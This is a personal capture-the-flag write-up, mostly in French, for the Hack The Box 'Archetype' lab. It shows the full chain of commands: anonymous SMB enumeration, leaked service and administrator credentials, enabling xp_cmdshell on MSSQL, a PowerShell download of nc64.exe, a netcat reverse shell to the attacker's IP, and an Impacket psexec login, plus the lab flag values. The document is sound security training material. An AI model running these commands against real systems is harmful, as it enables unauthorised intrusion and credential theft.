## Lab Title: Archetype
- Date: 2025-09-21
- Duration: ~30 minutes

### Platform: HTB – Starting Point > Tier 2

### 1. Scenario Summary
1. Découverte : scan Nmap révèle 135/139/445/1433 et un partage `backups` accessible (blank password) contenant les identifiants `ARCHETYPE\sql_svc:M3g4c0rp123`.

2. Exploitation : avec `mssqlclient.py` d’Impacket on se connecte à MSSQL, active `xp_cmdshell`, télécharge `nc64.exe` via PowerShell et obtient une reverse shell (user.txt trouvé).

3. Élévation : exécution de `winPEAS` révèle `ConsoleHost_history.txt` contenant le mot de passe Admin, puis `impacket-psexec` permet d’obtenir la session SYSTEM/Administrator et récupérer `root.txt`.


### 2. Findings
1. Pour trouver le port ouvert:
    - Nmap est utilisé: `nmap $ip -Pn --top-ports=1000`
    - J'ai trouvé ces ports ouverts:
    ```code
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        445/tcp  open  microsoft-ds
        1433/tcp open  ms-sql-s
    ```

2. Pour montrer les `SMB shares` non-administrative
    - J'ai utilisé `smbclient`
        - `smbclient -L $ip` >> pour le mot de passe: `blank password`
        - J'ai obtenu ces resultats:
    ```code
        ADMIN$          Disk      Remote Admin
	    backups         Disk
	    C$              Disk      Default share
	    IPC$            IPC       Remote IPC
    ```
3. Pour connecter ce partage non-administrative, j'ai utilisé également `smbclient`:
    - `smbclient \\\\$ip\\backups` >> avec le mot de passe `blank password` >> just appuyer simplement sur `Enter`
    - Voilà, j'ai trouvé le compte de service: `Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;`
        - `sql_svc` et son mot de passe: `M3g4c0rp123`

4. Pour establier une connnection avec MS SQL Serveur, on doit utiliser le script de **impacket:** `mssqlclient.py`
    - `pip show -f impacket`
    - `python3 mssqlclient.py ARCHETYPE\sql_svc@$ip -windows-auth`
        - Cela demande le mot de passe pour ce compte de service: `sql_svc`

5. Dans MS SQL Serveur, il y a une capabilité de `terminal` pour lancer `Windows Command Shell`
    - Cette capabilité s'appele: **xp_cmdshell**
    - Pour activer ça: on doit faire ces actions suivis dans le serveur:
    ```code
        EXEC sp_configure 'show advanced options', 1;
        RECONFIGURE;
        EXEC sp_configure 'xp_cmdshell', 1;
        RECONFIGURE;
    ```
6. Pour trouver et rechercher les moyens dans Windows pour `privelege escalation`, on doit utiliser **winPEAS**
    - WinPEAS (Windows Privielege Escalation Awesome Scripts Suite)
    - `winPEASx64.exe` est possible de télécharger de GitHub repo
    - Donc, on doit avoir cela pour fair `escalation`

7. Maintenant, on doit mettre les logiciels nécessaires pour continuer ses actions:
    - D'abord, on doit avoir `reverse shell` >> pour cela >> on doit utiliser **netcat**
    - Dans le machine d'attaquant, on fait
        - `python3 -m http.server 8000` avec le logiciel: `nc64.exe`
    - Et, en ce moment, on utilise `powershell` dans SQL Serveur: `xp_cmdshell`
        - Avec le compte: `sql_svc`, on peut mettre le fichier dans le `Downloads` dossier.
        - `powershel -c cd C:\Users\sql_svc\Downloads; Invoke-WebRequest http://$ip:8000/nc64.exe -outfile nc64.exe`
            - Dans le machine d'attaquant, on a recu le message `GET` pour ce fichier. >> cela est la preuve
    - Et, en ce moment, dans le machine attaquant, on fait:
        - `nc -lvpn 443`: l (listening), v(verbose), p(souce_port), n(no DNS resolution), **listen on port 443**
    - Dans le SQL >> **xp_cmdshell**, on exécute la commande pour lancer `nc64.exe`:
        - `powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.77 443`
        - `-e` indique à `nc` d'exécuter le programme fourni (cmd.exe) et de rediriger son entrée/sortie standard sur la connexion réseau.
        - ça crée une reverse shell vers l'IP/port indiqués.

8. Après, on a la reverse shell >> on a changé le dossier au Desktop pour trouver le drapeau:
    - Là-bas, on a trouvé: `user.txt` avec le drapeau: `3e7b102e78218e935bf3f4951fec21a3`

9. Quand on a utilisé `winPEASx64.exe`, on a trouvé que: `ConsoleHost_history.txt` existait.
    - Et donc, à l'intérieur, on a trouvé **le mot de passe** de **Administrator**
    - `net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!`

10. Après, on a dû utiliser `impacket-psexec` avec les privilèges d'administrator:
    - `python3 impacket-psexec administrator@$ip` et `son mot de passe`
    - Et on a changé le dossier au Desktop où on a trouvé: `root.txt` avec le drapeau: `b91ccec3305e98240082d4474b848528`

### 3. Idea
1. *C$, ADMiIN$, IPC$ sont des administrative shares créés par défaut.*

2. `$` >> **c’est un partage caché (hidden share) dans Windows.**

3. La reverse shell avec `nc64.exe` et rechercher les privilèges avec `winPEASx64.exe` dans Windows

4. L'usage de `impacket`: **mssqlclient.py et psexec.py** pour la connexion avec Windows

5. Le serveur MS SQL: `xp_cmdshell` capabilité et c'est génial de savoir ça. De ce serveur, l'usage de `powershell` pour mettre et lancer les logiciels!

6. Voilà, ça y est, c'est fini: `https://labs.hackthebox.com/achievement/machine/2118023/287`
